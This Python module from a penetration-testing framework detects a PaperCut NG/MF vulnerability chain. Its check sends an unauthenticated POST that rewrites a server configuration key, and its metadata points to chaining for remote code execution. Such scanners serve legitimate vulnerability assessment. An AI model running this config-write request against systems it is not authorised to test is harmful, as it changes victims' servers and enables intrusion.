#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect PaperCut CVE-2026-82078 unsafe external user lookup SQL primitive."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "PaperCut CVE-2026-82078 SQL Primitive Detect",
        "description": (
            "Detects CVE-2026-82078 in PaperCut NG/MF when chained with CVE-2026-81578: "
            "attacker-controlled user-lookup SQL templates and JDBC driver settings can "
            "be written via unauthenticated Tapestry ConfigEditor direct-service requests."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-82078", "CVE-2026-81578"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-82078",
            "https://www.papercut.com/kb/Main/security-bulletin-27-aug-2026-urgent-security-advisory/",
        ],
        "modules": [
            "scanner/http/papercut_cve_2026_81578_detect",
        ],
        "tags": [
            "web",
            "scanner",
            "papercut",
            "sql-injection",
            "jdbc",
            "rce",
            "cve-2026-82078",
            "vuln",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.35,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["papercut"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "rce_surface", "from_detail": "external lookup SQL"},
                ],
                "suggested_followups": [
                    "scanner/http/papercut_cve_2026_81578_detect",
                ],
            },
        },
    }

    render_page = OptString("Home", "Public render page for Tapestry direct service", False, advanced=True)

    _CONFIG_KEYS = (
        "user-lookup.enabled",
        "user-lookup.db-driver",
        "user-lookup.db-url",
        "user-lookup.id-to-username-sql",
        "auth.web-login.card-id.enable",
    )

    def _is_papercut(self) -> bool:
        response = self.http_request(method="GET", path="/app", allow_redirects=True)
        body = (response.text or "") if response else ""
        return "papercut" in body.lower()

    def _config_write_reachable(self) -> bool:
        render = str(self.render_page or "Home").strip() or "Home"
        path = f"/app?service=direct/1/{render}/ConfigEditor/$Form"
        data = {"configSearch": "user-lookup", "configKey": "user-lookup.enabled", "configValue": "N"}
        response = self.http_request(method="POST", path=path, data=data, allow_redirects=False)
        if not response:
            return False
        code = int(response.status_code or 0)
        body = response.text or ""
        location = str(response.headers.get("Location") or "")
        if "login" in location.lower():
            return False
        markers = ("ConfigEditor", "user-lookup", "configKey", "Saved", "Configuration")
        return code in (200, 302, 500) and any(marker in body for marker in markers)

    def run(self):
        if not self._is_papercut():
            return False
        if self._config_write_reachable():
            self.set_info(
                severity="critical",
                cve="CVE-2026-82078",
                reason=(
                    "Unauthenticated ConfigEditor reachable for user-lookup keys "
                    "(chain with CVE-2026-81578 for RCE)"
                ),
                keys=list(self._CONFIG_KEYS),
            )
            return True
        return False
